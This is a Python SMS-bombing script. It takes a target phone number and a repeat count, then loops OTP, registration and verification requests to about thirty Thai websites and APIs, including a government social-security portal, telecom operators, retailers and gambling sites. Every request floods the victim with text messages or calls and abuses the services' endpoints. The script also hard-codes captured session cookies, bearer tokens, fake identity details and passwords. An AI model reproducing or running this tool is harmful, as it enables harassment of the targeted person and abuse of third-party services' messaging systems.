import asyncio
import requests
from requests import Session
from requests import get
from re import search
import os
os.system ("clear")
icon = """
  ---------------
 < Hello, sayser! >
  ---------------
    \
     \              .-'||'-.
      \           .'   ||   '.
       \         /   __||__   \
                 | / -    - \ |
                 | | 6    6 | |
                 \/\____7___/\/
         .--------:\:I:II:I:/;--------.
        /          \ :I::I: /          \
       |            '------'            |
       |             \____/             |
       |      ,    __     ___    ,      |
       |======|   /  |   / _ \   |======|
       |======|   ^| |  | | | |  |======|
       |~~~~~|     | |  | |_| |   |~~~~~|
       |     |\   [___]  \___/   /|     |
        \    \|                  |/    /
         \    \  _ _.-=''=-._ _  /    /'
          '\   ' _)\\-++++-//(_ '   /'
            ;   (__||      ||__)   ;
             ;   ___\      /___   ;
              '. ---/-=..=-\--- .'
                '          '' 

"""
print (icon);
phone=input("phone: ")
number=int(input("number: "))

async def sayser():
        useragent = "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36"
        x = requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp', headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"}, data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://shopgenix.com/api/sms/otp/", headers={
            "Host": "shopgenix.com",
            "content-length": "37",
            "sec-ch-ua-mobile": "?1",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-requested-with": "XMLHttpRequest",
            "sec-ch-ua-platform": "Android",
            "accept": "application/json, text/javascript, /; q=0.01",
            "origin": "https://shopgenix.com",
            "referer": "https://shopgenix.com/app/5364874/",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty"
            }, data=f"mobile_country_id=1&mobile={phone}")
        print ("spem_",x.status_code)
        session = Session()
        ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": useragent}).text
        x = session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms", headers={"User-Agent": useragent,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://www.nowbet.com/th/api/sendotpth",data=f"countryCode=TH&mobileId={phone}&lang=th",headers={"content-type":"application/x-www-form-urlencoded; charset=UTF-8","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36","cookie":"SESS83a7d6b33c387766ae5a70114b602df1=6qfWqbFmub7pFfl%2CIupZdbbW-tlmJiOkDaVeElRTFc7fo3QN;lang=th;_fbp=fb.1.1651112908737.938380324"})
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://api.ulive.youpik.com/api-base/sms/sendCode",data=f"phone={phone}&type=1",headers={"content-type":"application/x-www-form-urlencoded;charset=UTF-8","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36"})
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://play.gkingbet.com/api/register/sms",json={"phone":phone,"agent_id":5,"country_code":"TH"})
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://www.tgfone.com/signin/otp_chk_fast",headers= {
                "accept": "text/html, */*; q=0.01",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-requested-with": "XMLHttpRequest",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
                "origin": "https://www.tgfone.com",
                "referer": "https://www.tgfone.com/login"
                },data=f"mobile={phone}&type_otp=7")
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://api.thaisme.one/smegp/register/request-otp",headers={
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
                "origin": "https://www.thaismegp.com",
                "referer": "https://www.thaismegp.com/"
                },json={"MOBILE":phone})
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://ufaclub99.com/member/Register/Request_OTP",headers={
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-requested-with": "XMLHttpRequest",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
                "origin": "https://ufaclub99.com",
                "referer": "https://ufaclub99.com/member/register",
                "cookie": "ci_session=re834geqv85ugp62u6v88i9n15ub5qin"
                },data=f"phonetxt={phone}")
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://aff.ufaclub24.org/pin.php",headers={
                "origin": "https://aff.ufaclub24.org",
                 "content-type": "application/x-www-form-urlencoded",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "referer": "https://aff.ufaclub24.org/phoneregis.php?invitekey=41bfd20a38bb1b0bec75acf0845530a7",
                "cookie": "PHPSESSID=n6da80gl0j6u7ob1ltlseb5m6p;_ga=GA1.2.18658305.1649308092;_gid=GA1.2.1210153607.1649308092;_gat_gtag_UA_155192447_2=1"
                },data=f"invitekey=41bfd20a38bb1b0bec75acf0845530a7&txtTel={phone}")
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://ufa8.co/register",headers={
                "origin": "https://ufa8.co",
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "referer": "https://ufa8.co/register"
                },data=f"register=1&phone={phone}&password=Kan064402&password2=Kan064402&line=Garenarov")
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={phone}", headers={
    "Accept": "application/json, text/plain, /",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
    "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"})
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}")
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/", headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"}, json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://www.bigthailand.com/authentication-service/user/OTP", json={"locale":"th","phone": f"+66{phone[1:]}","email":"dkdk@gmail.com","userParams":{"buyerName":"ekek ks","activateLink":"www.google.com"}}, headers={"content-type": "application/json","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg","cookie": "auth.strategy=local;auth._token.local=Bearer%20eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg;_utm_objs=eyJzb3VyY2UiOiJnb29nbGUiLCJtZWRpdW0iOiJjcGMiLCJjYW1wYWlnbiI6ImFkd29yZHMiLCJj%0D%0Ab250ZW50IjoiYWR3b3JkcyIsInRlcm0iOiJhZHdvcmRzIiwidHlwZSI6InJlZmVycmVyIiwidGlt%0D%0AZSI6MTY0MjMyOTM5OTU4NSwiY2hlY2tzdW0iOiJaMjl2WjJ4bExXTndZeTFoWkhkdmNtUnpMVEUy%0D%0ATkRJek1qa3pPVGsxT0RVPSJ9;_pk_ref.564990563.2c0e=%5B%22%22%2C%22%22%2C1642329400%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D;_pk_ses.564990563.2c0e=*;_gcl_au=1.1.833577636.1642329400;_asm_visitor_type=n;_ac_au_gt=1642329406505;cdp_session=1;_asm_uid=637506384;_ga=GA1.2.1026893832.1642329403;_gid=GA1.2.1437369318.1642329403;OptanonConsent=isIABGlobal=false&datestamp=Sun+Jan+16+2022+17%3A36%3A45+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.9.0&hosts=&consentId=e0fe7ec6-3c1e-4aa7-9e72-ecd2ed724416&interactionCount=0&landingPath=https%3A%2F%2Fwww.bigthailand.com%2Fcategory%2F850%2F%25E0%25B8%2599%25E0%25B9%2589%25E0%25B8%25B3%25E0%25B8%25A1%25E0%25B8%25B1%25E0%25B8%2599%25E0%25B9%2580%25E0%25B8%2584%25E0%25B8%25A3%25E0%25B8%25B7%25E0%25B9%2588%25E0%25B8%25AD%25E0%25B8%2587%25E0%25B9%2581%25E0%25B8%25A5%25E0%25B8%25B0%25E0%25B8%2582%25E0%25B8%25AD%25E0%25B8%2587%25E0%25B9%2580%25E0%25B8%25AB%25E0%25B8%25A5%25E0%25B8%25A7%2F%25E0%25B8%2599%25E0%25B9%2589%25E0%25B8%25B3%25E0%25B8%25A1%25E0%25B8%25B1%25E0%25B8%2599%25E0%25B9%2580%25E0%25B8%2584%25E0%25B8%25A3%25E0%25B8%25B7%25E0%25B9%2588%25E0%25B8%25AD%25E0%25B8%2587%3Fgclid%3DCj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0007%3A1;_fbp=fb.1.1642329406623.363807498;_hjSessionUser_2738378=eyJpZCI6ImVkNmZhOGY3LTQwNDctNTNjMi04YTVjLTQ0OGE5MDA4YjhiZCIsImNyZWF0ZWQiOjE2NDIzMjk0MDQ4MDMsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjIncludedInSessionSample=0;_hjSession_2738378=eyJpZCI6ImNhN2UwZDFhLTZkNmQtNGM0Mi04YmI1LTg4NWJmNzZjMGExZCIsImNyZWF0ZWQiOjE2NDIzMjk0MTEwNzcsImluU2FtcGxlIjpmYWxzZX0=;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_gac_UA-165856282-1=1.1642329477.Cj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB;_gcl_aw=GCL.1642329478.Cj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB;_pk_id.564990563.2c0e=0.1642329400.1.1642329489.1642329400.;_ac_client_id=637515726.1642329496;_ac_an_session=zmzlzhzlzizqzmzjzkzjzdzlzgzkzmzizmzkzhzlzdzizlznzhzgzhzqznzqzlzdzizdzizlznzhzgzhzqznzqzlzdzizlznzhzgzhzqznzqzlzdzizdzgzjzizdzjzd2h25zdzgzdzezizd;au_id=637515726;_ga_80VN88PBVD=GS1.1.1642329399.1.1.1642329493.44"})
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=66{phone[1:]}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2")
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register", json={"username":phone,"password":"1111a1111A","name":phone,"provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"}, headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={
  "on": {
    "value": phone,
    "country": "66"
  },
  "type": "mobile"
},headers={"accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8"})
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://login.s-momclub.com/accounts.otp.sendCode", data=f"phoneNumber=%2B66{phone[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json", headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "gmid=gmid.ver4.AcbHriHAww._ill8qHpGNXtv9aY3XQyCvPohNww4j7EtjeiM3jBccqD7Vx0OmGeJuXcpQ2orXGs.nH0yRZjbm75C-5MVgB2Ii0PWvx6TICBn1LYI_XtlgoHg9mnouZgNs6CHULJEitOfkBhHvf8zUvrvMauanc52Sw.sc3;ucid=Tn63eeu2u8ygoINkqYBk5w;hasGmid=ver4;_ga=GA1.2.1714152564.1642328595;_fbp=fb.1.1642328611770.178002163;_gcl_au=1.1.64457176.1642329285;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;_gid=GA1.2.1524201365.1642442639;_gat=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gat_UA-62402337-1=1"})
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"+66{phone[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": "dec"}})
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://www.carsome.co.th/website/login/sendSMS", json={"username":phone,"optType":0})
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://api-globalhouse.com/sms/requestOTP",headers={
    "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJBUFAtU2VydmljZSIsImlhdCI6MTYxMDgwNjQ0NDQxM30.0BWQpa9RO61bUpI45ncdngikQX0xmy2fwsRtZsZNlCc",
    "content-type": "application/json; charset=utf-8",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
    "accept": "*/*",
    "origin": "https://m.globalhouse.co.th",
    "referer": "https://m.globalhouse.co.th/"
            },json={"phonNumber":phone})
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://gamingnation.dtac.co.th/api/otp/request",json={"template":"register","phone_no":phone,"token":"03AGdBq257kzKUMJ1ob4zTwDWOVXpLdk4FcMHa_nwlf3xt816SvNfzramnqWTE-yrfjWuQHjNlBrgAZlqspYl-5EH6anY7qorOpa_OmjqLK0TeTajlqAeJLh-jd3QfJyjKbPT1ralDApTC5PHpdGVMQ2sdbX3GKPjpGy2-9r27Kgd8ZF2JUuTgrNIS3ljBDYjuAqt6Rbn0me7ikEd0Ns7a3VXL5Gs8UkiOojLgFh5WK8J80zymilWxqkVQX0-KI_NaDcZKDuWwMHzs2-W68U8qbUUb4B0kNfzwfH9PcftDbdbCPZ43ZcWF2xepsvXhIXIipMawBK3H6fvwmUa1G9_-5I9c-DuPnTi7gq27SV12i4uxwwlpzNpNnofPmZ8vOv9tzxgoHCWkCbMgJVPYRl-PogXqpZBLhXHawb2FGxx--OjKuraWRLRg1-nC-ZK0_xcOCTqjCad-dDyP49aC2BWRlJd8VhskCzH0S4B-I6lRg78qSWV3mQ1vbNrsp_Xk3pjfiilZqznCkPLN29vpVezJIyweRKYTMFlV1Q"},headers={"User-Agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36","Cookie":"i18n_redirected=th; _gcl_au=1.1.1259613914.1645770250; _fbp=fb.2.1645770253711.1894109895; _hjSessionUser_2510409=eyJpZCI6IjY1NDUxZTZiLTMxNDYtNWY2NS1iZTI5LTJlYTg2YTUxZWRiMiIsImNyZWF0ZWQiOjE2NDU3NzAyNTM1NTUsImV4aXN0aW5nIjp0cnVlfQ==; v10DeviceID=76d43cf572c2921a5fb598a66248e158; v10UA=DTAC%2F10.0%2Fweb%2F1.0%2FNetworkType%2F76d43cf572c2921a5fb598a66248e158%2FM2006C3LG-Chrome; fromApp=dtacLite; v10Lang=th; OptanonAlertBoxClosed=2022-02-25T06:31:00.287Z; _hjSessionUser_1100693=eyJpZCI6ImUzMWM2NjcyLTBjMzAtNTIxZC05ZDdiLTFlNjg3NTc4ZjkxZSIsImNyZWF0ZWQiOjE2NDU3NzA2ODE3NTUsImV4aXN0aW5nIjp0cnVlfQ==; _ga=GA1.3.176519351.1645770253; OptanonConsent=isIABGlobal=false&datestamp=Fri+Feb+25+2022+13%3A33%3A21+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.15.0&hosts=&consentId=cd42bf1d-c1ac-4a3f-b20c-54d16145aa24&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0004%3A1&geolocation=TH%3B84&AwaitingReconsent=false; cto_bundle=2wShxV91OFdyc3NvNVQ5TUZ3VFZzM0JkOWlQSFMxZU8xMXF2Y3VxR1RWJTJGOTcySkVCU3VqZ09haVByaHVNT3hjQTY0VUQyTHF6WXhVMEl0Um1KUDZVTFh3JTJGdWxOck9VZ1U3aDNVYVBJVyUyQnB3dXAwWThlR2tvMnh1WlRTWlRjU3hscGxaZkxkJTJGWUhXeVI4dUJHb2MwcnNiNXVyQSUzRCUzRA; _ga_EGFFCDXTW2=GS1.1.1645770681.1.1.1645770804.0; _gid=GA1.3.1993109359.1647399772; auth.strategy=local; _gat_UA-16732483-1=1; _hjIncludedInSessionSample=0; _hjSession_2510409=eyJpZCI6IjIyNGE1NzFlLTdhOTUtNDMzNC1iMjE2LWVhNjc5YzIwNjA4MSIsImNyZWF0ZWQiOjE2NDc0MDY0NzAyOTAsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0"})
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)
        x = requests.post("https://www.theconcert.com/rest/request-otp",data={'mobile': f"{phone}", 'country_code': "TH", 'lang': "th", 'channel': "call", 'digit': '4'},)
        print ("\033[1;37;31mspem\033[1;37;34m_\033[1;37;40m",x.status_code)


for i in range(number):
    try:
        asyncio.run(sayser())
    except:
           print ("\033[1;37;31mfail!!!")
